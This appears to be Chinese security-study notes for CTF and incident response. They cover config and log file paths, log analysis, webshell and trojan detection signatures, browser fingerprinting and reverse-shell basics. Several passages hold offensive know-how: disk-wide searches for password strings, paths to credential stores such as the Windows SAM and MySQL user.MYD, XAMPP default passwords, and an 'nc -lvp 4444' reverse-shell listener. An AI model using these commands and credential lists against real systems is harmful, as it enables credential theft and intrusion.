+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找文件</span></span><br><span class="line">find / -name filename.ext</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全盘查找含有 flag 的文件</span></span><br><span class="line">grep flag -r /</span><br><span class="line"><span class="built_in">sudo</span> find / -<span class="built_in">type</span> f -name <span class="string">&quot;*.conf&quot;</span> -<span class="built_in">exec</span> grep -n <span class="string">&quot;flag&#123;&quot;</span> &#123;&#125; \;</span><br><span class="line"><span class="built_in">sudo</span> find / -<span class="built_in">type</span> f -name <span class="string">&quot;*.log&quot;</span> -<span class="built_in">exec</span> grep -n <span class="string">&quot;flag&#123;&quot;</span> &#123;&#125; \;</span><br><span class="line"><span class="built_in">sudo</span> find / -<span class="built_in">type</span> f -name <span class="string">&quot;*.php&quot;</span> -<span class="built_in">exec</span> grep -n <span class="string">&quot;eval&quot;</span> &#123;&#125; \;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong><font style="color:rgb(0, 0, 0);">Windows 相关：</font></strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 全盘查找文件，一定要加一个星号！</span></span><br><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (password.txt*) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"><span class="keyword">for</span> /r c:\ %i <span class="keyword">in</span> (*.ini) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找 C 盘中包含 password 字样的文件，一定要双引号！</span></span><br><span class="line">findstr /s /n <span class="string">&quot;password&quot;</span> c:\*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找 pwd.txt 中是否包含 password 字样，一定要双引号！</span></span><br><span class="line">find /N /I <span class="string">&quot;password&quot;</span> pwd.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见的配置文件名"><a href="#常见的配置文件名" class="headerlink" title="常见的配置文件名"></a><font style="color:rgb(1, 110, 140);">常见的配置文件名</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># apache</span></span><br><span class="line">httpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL</span></span><br><span class="line">my.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟主机配置</span></span><br><span class="line">httpd-vhosts.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># IIS</span></span><br><span class="line">metabase.xml</span><br><span class="line">applicationHost.config</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssh</span></span><br><span class="line">/etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment"># nginx</span></span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/etc/nginx/sites-enabled/default</span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP</span></span><br><span class="line">php.ini</span><br><span class="line"><span class="comment"># weblogic 读密码</span></span><br><span class="line">./security/SerializedSystemIni.dat</span><br><span class="line">./config/config.xml</span><br></pre></td></tr></table></figure>
+
+<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a><font style="color:rgb(1, 110, 140);">Apache</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件路径</span></span><br><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认站点路径</span></span><br><span class="line">/var/www/html/</span><br><span class="line"></span><br><span class="line"><span class="comment"># ubuntu 下配置文件</span></span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问日志和错误日志</span></span><br><span class="line">/private/var/log/apache2/error_log</span><br><span class="line">/private/var/log/apache2/access_log</span><br></pre></td></tr></table></figure>
+
+<h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a><font style="color:rgb(1, 110, 140);">IIS</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">web.config</span><br></pre></td></tr></table></figure>
+
+<h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a><font style="color:rgb(1, 110, 140);">MySQL</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">/etc/my.cnf</span><br><span class="line">/etc/mysql/my.cnf</span><br></pre></td></tr></table></figure>
+
+<h3 id="phpMyAdmin"><a href="#phpMyAdmin" class="headerlink" title="phpMyAdmin"></a><font style="color:rgb(1, 110, 140);">phpMyAdmin</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">config.inc.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认路径</span></span><br><span class="line">/var/www/phpmyadmin/config.inc.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="XAMPP-建站"><a href="#XAMPP-建站" class="headerlink" title="XAMPP 建站"></a><font style="color:rgb(1, 110, 140);">XAMPP 建站</font></h3><p><font style="color:rgb(0, 0, 0);">相关路径</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 网站默认路径</span></span><br><span class="line">xampp\htdocs</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache 基本配置</span></span><br><span class="line">xampp\apache\conf\httpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache SSL</span></span><br><span class="line">xampp\apache\conf\ssl.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache Perl（仅限插件）</span></span><br><span class="line">xampp\apache\conf\perl.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache Tomcat（仅限插件）</span></span><br><span class="line">xampp\apache\conf\java.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache Python（仅限插件）</span></span><br><span class="line">xampp\apache\conf\python.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟主机</span></span><br><span class="line">xampp/apache/conf/extra/httpd-vhosts.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP</span></span><br><span class="line">xampp\php\php.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据库默认路径</span></span><br><span class="line">xampp\mysql\data</span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL</span></span><br><span class="line">xampp\mysql\bin\my.ini </span><br><span class="line"></span><br><span class="line"><span class="comment"># phpMyAdmin</span></span><br><span class="line">xampp\phpMyAdmin\config.inc.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># FileZilla FTP 服务器</span></span><br><span class="line">xampp\FileZilla</span><br><span class="line"></span><br><span class="line"><span class="comment"># FTP\FileZilla </span></span><br><span class="line">Server.xml Mercury </span><br><span class="line"></span><br><span class="line"><span class="comment"># 邮件服务器基本配置</span></span><br><span class="line">xampp\MercuryMail\MERCURY.INI </span><br><span class="line"></span><br><span class="line"><span class="comment"># Sendmail</span></span><br><span class="line">xampp\sendmail\sendmail.ini</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(0, 0, 0);">默认密码</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MySQL</span></span><br><span class="line">User: root   Password:（空）</span><br><span class="line"></span><br><span class="line"><span class="comment"># FileZilla FTP</span></span><br><span class="line">User: newuser   Password: wampp</span><br><span class="line">User: anonymous   Password: some@mail.net</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mercury</span></span><br><span class="line">Postmaster: postmaster (postmaster@localhost) </span><br><span class="line">Administrator: Admin (admin@localhost) </span><br><span class="line">TestUser: newuser   Password: wampp </span><br><span class="line"></span><br><span class="line"><span class="comment"># WEBDAV</span></span><br><span class="line">User: wampp   Password: xampp</span><br></pre></td></tr></table></figure>
+
+<h3 id="phpStudy-建站"><a href="#phpStudy-建站" class="headerlink" title="phpStudy 建站"></a><font style="color:rgb(1, 110, 140);">phpStudy 建站</font></h3><p><font style="color:rgb(0, 0, 0);">还记得几年前用 phpStudy 建站，贼费劲，可能是当时技术太差了，端口占用、数据库管理啥的都很乱，今天（2019年08月02日）在 Windows 上又搭了一次，发现啥问题也没遇到，技术、产品的更新换代真的太快了。</font></p>
+<p><font style="color:rgb(0, 0, 0);">现在还出了个 pro 版本，所以路径也相对的有了变化，本文以 Pro 版为例，如果是普通版，去掉 Pro 即可。</font></p>
+<p><font style="color:rgb(0, 0, 0);">相关路径</font></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根目录</span></span><br><span class="line">phpstudy\WWW</span><br><span class="line">phpstudy_pro\WWW</span><br><span class="line"></span><br><span class="line"><span class="comment"># phpMyAdmin</span></span><br><span class="line">phpstudy_pro\WWW\phpMyAdmin4.8.5</span><br><span class="line"></span><br><span class="line"><span class="comment"># php：Pro 版本，以扩展的方式来显示插件。</span></span><br><span class="line">phpstudy_pro\Extensions\php\php7.3.4nts\php.ini</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03、敏感文件"><a href="#0x03、敏感文件" class="headerlink" title="0x03、敏感文件"></a><font style="color:rgb(0, 136, 145);">0x03、敏感文件</font></h2><h3 id="探针等信息"><a href="#探针等信息" class="headerlink" title="探针等信息"></a><font style="color:rgb(1, 110, 140);">探针等信息</font></h3><p><font style="color:rgb(0, 0, 0);">在使用</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;XAMPP/LAMPP/phpStudy/PHPnow&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">建站时，可能留下来一些探针页面，可以找到一些可用的信息，比如</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;Document_Root&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">代表网站根目录，</font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;session.save_path&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">存放</font><font style="color:rgb(0, 0, 0);"> </font><code>&lt;font style=&quot;color:rgb(192, 52, 29);background-color:rgb(245, 245, 245) !important;&quot;&gt;Session&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);"> </font><font style="color:rgb(0, 0, 0);">信息。</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.php</span><br><span class="line">l.php</span><br><span class="line">p.php</span><br><span class="line">u.ph</span><br><span class="line">tz.php</span><br><span class="line">test.php</span><br><span class="line">info.php</span><br><span class="line">ceshi.php</span><br><span class="line">tanzhen.php</span><br><span class="line">phpinfo.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><font style="color:rgb(1, 110, 140);">Windows</font></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line">c:\boot.ini</span><br><span class="line"></span><br><span class="line"><span class="comment"># IIS配置文件</span></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml </span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储Windows系统初次安装的密码</span></span><br><span class="line">c:\windows\repair\sam </span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL配置</span></span><br><span class="line">c:\ProgramFiles\mysql\my.ini </span><br><span class="line"></span><br><span class="line"><span class="comment"># MySQL root密码</span></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD </span><br><span class="line"></span><br><span class="line"><span class="comment"># php 配置信息</span></span><br><span class="line">c:\windows\php.ini</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><p>一、基本知识</p>
+<p>（一）日志分析</p>
+<p>1.日志文件</p>
+<p>Linux日志分析是指对Linux系统中生成的日志文件进行检查、监控和分析的过程。在Linux系统中，各种服务和应用程序会产生日志文件，记录系统运行状态、用户操作、系统错误、安全事件等信息。分析这些日志可以帮助系统管理员理解系统的运行状况，诊断问题，并确保系统的安全和稳定运行。日志分析可以手动进行，也可以使用各种日志分析工具来自动化这一过程。常见的日志文件包括系统日志（&#x2F;var&#x2F;log&#x2F;syslog 或 &#x2F;var&#x2F;log&#x2F;messages）、认证日志（&#x2F;var&#x2F;log&#x2F;auth.log）、应用程序日志等。</p>
+<p>通常与用户登录和用户管理活动相关的日志文件是 &#x2F;var&#x2F;log&#x2F;auth.log 或其备份文件如 &#x2F;var&#x2F;log&#x2F;auth.log.1</p>
+<p>常见日志文件</p>
+<p>Linux系统中的日志文件通常存储在 &#x2F;var&#x2F;log 目录下，常见的日志文件包括：</p>
+<p>&#x2F;var&#x2F;log&#x2F;syslog：记录系统的各种信息和错误。</p>
+<p>&#x2F;var&#x2F;log&#x2F;auth.log：记录身份验证相关的信息，如登录和认证失败。</p>
+<p>&#x2F;var&#x2F;log&#x2F;kern.log：记录内核生成的日志信息。</p>
+<p>&#x2F;var&#x2F;log&#x2F;dmesg：记录系统启动时内核产生的消息。</p>
+<p>&#x2F;var&#x2F;log&#x2F;boot.log：记录系统启动过程中的消息。</p>
+<p>&#x2F;var&#x2F;log&#x2F;messages：记录系统的广泛消息，包括启动和应用程序信息。</p>
+<p>&#x2F;var&#x2F;log&#x2F;secure：记录安全相关的消息。</p>
+<p>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;：记录Apache HTTP服务器的访问和错误日志（若安装了Apache）。</p>
+<p>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;：记录Nginx服务器的访问和错误日志（若安装了Nginx）。</p>
+<p>2.常见网站日志的路径</p>
+<p>IIS（Internet Information Services）</p>
+<p>IIS是Windows上的默认Web服务器，其日志文件默认存储在以下路径：</p>
+<p>IIS 6.0 及更早版本：C:\WINDOWS\system32\LogFiles\W3SVC[SiteID]\</p>
+<p>IIS 7.0 及更高版本：C:\inetpub\logs\LogFiles\W3SVC[SiteID]\</p>
+<p>其中，[SiteID] 是网站的标识符，通常是一个数字。</p>
+<p>Apache HTTP Server</p>
+<p>如果在Windows上安装了Apache，日志文件默认存储在安装目录下的logs文件夹中：C:\Program Files (x86)\Apache Group\Apache2\logs\</p>
+<p>或者C:\Program Files\Apache Group\Apache2\logs\</p>
+<p>具体路径取决于安装时选择的位置。</p>
+<p>Linux系统中的网站日志路径</p>
+<p>在Linux上，Apache日志文件通常位于以下目录：</p>
+<p>访问日志：&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log或者&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</p>
+<p>错误日志：&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log</p>
+<p>不同的Linux发行版可能有不同的目录。例如，在Debian&#x2F;Ubuntu上通常使用&#x2F;var&#x2F;log&#x2F;apache2&#x2F;，而在Red Hat&#x2F;CentOS上通常使用&#x2F;var&#x2F;log&#x2F;httpd&#x2F;。</p>
+<p>Apache日志分析是专门针对Apache HTTP服务器生成的日志文件进行分析。Apache服务器主要生成两种类型的日志文件：</p>
+<p>访问日志（access log）：记录了所有对Web服务器的请求，包括客户端IP地址、请求时间、请求方式、请求资源、响应状态码、数据传输量等。</p>
+<p>错误日志（error log）：记录了服务器在运行过程中遇到的错误和警告信息，包括启动和停止时的信息。</p>
+<p>Nginx</p>
+<p>Nginx是另一个流行的Web服务器，默认的日志文件路径如下：</p>
+<p>访问日志：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>错误日志：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p>
+<p>3.如何查看和分析日志文件？</p>
+<p>Windows</p>
+<p>使用文本编辑器（如Notepad、Notepad++）直接打开日志文件查看。</p>
+<p>可以使用IIS管理器查看IIS日志。</p>
+<p>Linux</p>
+<p>使用命令行工具查看日志，例如：</p>
+<p>tail -f &#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log tail -f &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<p>AI运行代码</p>
+<p>bash</p>
+<p>可以使用日志分析工具（如GoAccess、AWStats）生成可视化的日志报告。</p>
+<p>4.常见日志文件位置</p>
+<p>Apache日志</p>
+<p>访问日志：默认位置通常是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log.1（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log.1（CentOS&#x2F;RHEL）</p>
+<p>错误日志：默认位置通常是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log.1（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log.1（CentOS&#x2F;RHEL）</p>
+<p>SSH日志</p>
+<p>身份验证日志：通常位于&#x2F;var&#x2F;log&#x2F;auth.log（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;secure（CentOS&#x2F;RHEL）</p>
+<p>系统日志</p>
+<p>系统日志：通常位于&#x2F;var&#x2F;log&#x2F;syslog（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;messages（CentOS&#x2F;RHEL）。</p>
+<p>5.日志筛选</p>
+<p>那需要怎么筛选呢？（加几个参数即可）</p>
+<p>cut：这是一个命令行工具，用于从每一行中提取特定的部分。</p>
+<p>-d-：指定字段的分隔符是-（一个连字符）。</p>
+<p>-f 1：指定要提取第一个字段（即连字符前的部分）。</p>
+<p>access.log.1：输入文件，假设这是Apache访问日志的文件名。</p>
+<p>那有的人就会问了，哎，为什么这个cut和cat就差一个字母，会不会效果一样啊？</p>
+<p>cat（concatenate）用于连接文件并打印到标准输出。通常用于查看文件的内容、合并文件和创建文件。</p>
+<p>cut用于从文件的每一行中提取指定的部分。通常用于处理列格式数据，比如从CSV文件中提取某些列。</p>
+<p>两者区别：</p>
+<p>用途不同</p>
+<p>cat主要用于连接和显示文件内容。</p>
+<p>cut主要用于从文件中提取特定的列或字段。</p>
+<p>功能不同</p>
+<p>cat可以将多个文件内容合并输出到一个文件或标准输出。</p>
+<p>cut可以根据指定的字符位置、字节位置或分隔符提取部分内容。</p>
+<p>常见用法不同</p>
+<p>cat常用于快速查看文件内容或合并文件。</p>
+<p>cut常用于处理表格数据、日志文件等，需要提取特定列的数据。</p>
+<p>举个例子：</p>
+<p>查看文件内容：</p>
+<p>cat file.txt</p>
+<p>提取日志文件中的IP地址（假设IP地址在日志文件的第一个字段，用空格分隔）：</p>
+<p>cut -d’ ‘ -f1 access.log</p>
+<p>（二）webshell</p>
+<p>1.代码特征</p>
+<p>可疑函数调用</p>
+<p>WebShell通常会使用一些危险的函数来执行系统命令或代码，如：</p>
+<p>PHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()</p>
+<p>ASP: Execute(), Eval(), CreateObject()</p>
+<p>JSP: Runtime.getRuntime().exec()</p>
+<p>编码和解码</p>
+<p>WebShell经常使用编码和解码技术来隐藏其真实意图，如Base64编码：</p>
+<pre><code> eval(base64_decode(&#39;encoded_string&#39;));
+</code></pre>
+<p>文件操作</p>
+<p>WebShell可能会包含文件操作函数，用于读取、写入或修改文件：</p>
+<p>PHP: fopen(), fwrite(), file_get_contents(), file_put_contents()</p>
+<p>ASP: FileSystemObject</p>
+<p>2.网络操作</p>
+<p>WebShell可能会包含网络操作函数，用于与远程服务器通信：</p>
+<p>PHP: fsockopen(), curl_exec(), file_get_contents(‘<a target="_blank" rel="noopener" href="http://...'/">http:&#x2F;&#x2F;…’)</a>)</p>
+<p>ASP: WinHttp.WinHttpRequest</p>
+<p>3.Webshell特征</p>
+<p>哥斯拉病毒</p>
+<p>一种Java后门木马，通常用于攻击并控制Web服务器。特征就包括：</p>
+<p>@session_start(); - 开启一个会话。</p>
+<p>@set_time_limit(0); - 设置脚本执行时间为无限。</p>
+<p>@error_reporting(0); - 关闭所有错误报告。</p>
+<p>4.Webshell日志分析</p>
+<p>思路</p>
+<p>查看服务器访问日志和错误日志，寻找异常访问和执行模式。</p>
+<p>检查文件修改时间，与正常更新周期不符的文件可能是可疑的。</p>
+<p>基于特征的检测：</p>
+<p>使用YARA规则等特征检测工具，根据已知的免杀马特征进行扫描。</p>
+<p>总结：免杀马通过静态检测是检测不到的，因为在免杀的过程中将webshel的特征值以及特征函数都给去掉了，因为webshell执行会在网站日志留下记录，那我们就到网站日志里面看看有啥可疑的记录，这里也顺便说一下linux的日志存放在&#x2F;var&#x2F;log目录下。</p>
+<p>（三）木马</p>
+<p>1.免杀马</p>
+<p>免杀马（免杀病毒或免杀Webshell）是指经过特殊处理和混淆，使其能够避开杀毒软件和安全检测工具识别的恶意软件或后门程序。黑客使用各种技术手段，使恶意代码看起来像是正常代码，从而躲避签名检测和基于规则的安全机制。这种技术通常用于Webshell和其他后门程序，目的是保持对受害系统的隐蔽访问。</p>
+<p>常见的免杀技术</p>
+<p>代码混淆：使用混淆工具或手动混淆代码，使其难以被直接阅读和分析。</p>
+<p>编码和加密：使用Base64、ROT13等编码方式或更复杂的加密技术隐藏恶意代码片段。</p>
+<p>动态生成和执行：通过动态生成代码并在运行时执行，绕过静态分析。例如，使用 eval()、create_function() 等PHP函数。</p>
+<p>多层解码：多层编码或加密，增加分析和检测的难度。</p>
+<p>使用合法函数：恶意代码嵌入到看似合法的代码中，利用正常的函数调用执行恶意操作。</p>
+<p>查找和处理免杀马的方法</p>
+<p>文件完整性检查：比较当前文件与已知的良性备份文件，发现被修改或新增的文件。</p>
+<p>代码审查：手动检查可疑文件，寻找混淆、编码、加密和动态执行的代码模式。</p>
+<p>安全扫描工具：使用高级安全扫描工具，这些工具使用行为分析和机器学习来检测潜在的免杀马。</p>
+<p>2.一句话木马</p>
+<p>简介</p>
+<p>一句话木马是一种极为简短且隐蔽的恶意代码，通常嵌入到网站的 PHP 文件中，用于远程执行任意代码或命令。这种木马之所以被称为“一句话木马”，是因为它们通常只包含一行代码，但功能强大且危险。</p>
+<p>特征</p>
+<p>简短：通常只有一行代码，易于隐藏和注入。</p>
+<p>使用 eval 函数：利用 eval 函数执行传入的 PHP 代码。</p>
+<p>通过 HTTP 参数传递代码：常见的方式是通过 GET 或 POST 请求参数传递要执行的代码。</p>
+<p>基础验证：一些一句话木马会有简单的验证机制，比如检查一个参数的值是否符合某个条件。</p>
+<p>那为什么可以确认POST[xxx]括号里面的就是密码呢？</p>
+<p>很简单，这是固定的，[]里面的内容自古以来就是密码！</p>
+<p>3.不死马</p>
+<p>简介</p>
+<p>不死马（Persistence Backdoor）是一种能够在系统中保持长期存在并持续运行的恶意软件，即使系统重启或某些安全措施生效后，它依然能够恢复运行。不死马通常会通过修改系统关键配置、添加定时任务、劫持系统进程等手段来实现持久化。</p>
+<p>简单来说；</p>
+<p>不死马是一种具有持久性的后门程序，它被设计用来在受感染的系统上长期驻留并保持活跃。其目的是确保攻击者对系统的访问不会因为系统重启或其他干预措施而中断。</p>
+<p>特征</p>
+<p>持久性：自启动：通过修改系统启动项、服务、计划任务等方式实现自启动。</p>
+<p>文件隐藏：使用技术手段隐藏自身文件，避免被发现和删除。</p>
+<p>多重存在：可能在多个位置部署副本，增强存活能力。</p>
+<p>隐蔽性：低调运行：以低优先级运行，不占用过多系统资源，减少被注意的可能。</p>
+<p>多态性：定期更改自身代码或行为模式，规避签名检测。</p>
+<p>日志清除：清除自身操作痕迹，减少被追踪的可能。</p>
+<p>多样化的保持机制</p>
+<p>启动项：在 Windows 中，可以修改注册表中的启动项，在 Linux 中，可以修改 rc.local 或 crontab。</p>
+<p>服务劫持：创建或劫持合法的系统服务。</p>
+<p>计划任务：在系统计划任务中添加恶意任务。</p>
+<p>（四）浏览器指纹</p>
+<p>浏览器指纹（Browser Fingerprinting）是指通过收集和分析浏览器和设备的特征信息，创建一个唯一的标识符，从而识别或跟踪用户。这种技术不仅仅依赖于常规的Cookie，还利用浏览器和设备的多种属性来进行识别。</p>
+<p>1.常见属性</p>
+<p>浏览器类型和版本：使用的浏览器及其版本。</p>
+<p>操作系统：设备所运行的操作系统及其版本。</p>
+<p>时区：设备的时区设置。</p>
+<p>语言和区域设置：浏览器和操作系统的语言设置。</p>
+<p>屏幕分辨率和色深：设备屏幕的分辨率和颜色深度。</p>
+<p>插件和扩展：已安装的浏览器插件和扩展。</p>
+<p>字体：系统上安装的字体。</p>
+<p>HTTP头：浏览器在请求时发送的HTTP头信息，包括User-Agent、Accept、Accept-Language等。</p>
+<p>Canvas指纹：使用HTML5 Canvas元素绘制图形并分析生成的图像数据，以获取独特的图形渲染特征。</p>
+<p>WebGL指纹：利用WebGL的特性，通过绘制3D图形来获取设备的渲染特性。</p>
+<p>设备性能特征：CPU、GPU、内存等硬件信息。</p>
+<p>2.使用浏览器指纹的目的</p>
+<p>追踪用户活动：在用户禁用Cookie或使用隐私保护工具时，仍然能够跟踪用户的在线活动。</p>
+<p>识别并避开安全系统：通过识别用户的浏览器指纹，可以绕过某些安全系统或反欺诈措施，假装成合法用户进行恶意活动。</p>
+<p>目标攻击：了解目标用户的设备和浏览器特性，从而制定更有针对性的攻击策略，比如利用特定浏览器或操作系统的已知漏洞进行攻击。</p>
+<p>（五）黑客反弹shell</p>
+<p>解题思路：让我们找出黑客反弹shell的ip是什么</p>
+<p>那我们先简单了解一下反弹shell的原理，反弹Shell（Reverse Shell）的原理是攻击者通过在目标系统上运行恶意代码，使得目标系统主动与攻击者的控制服务器建立连接，从而绕过防火墙和其他安全措施。</p>
+<p>1.反弹Shell的工作原理</p>
+<p>攻击者准备监听：攻击者在其控制的服务器上启动一个监听程序（通常是一个Netcat或类似工具），等待目标系统主动连接。</p>
+<p>nc -lvp 4444</p>
+<p>AI运行代码</p>
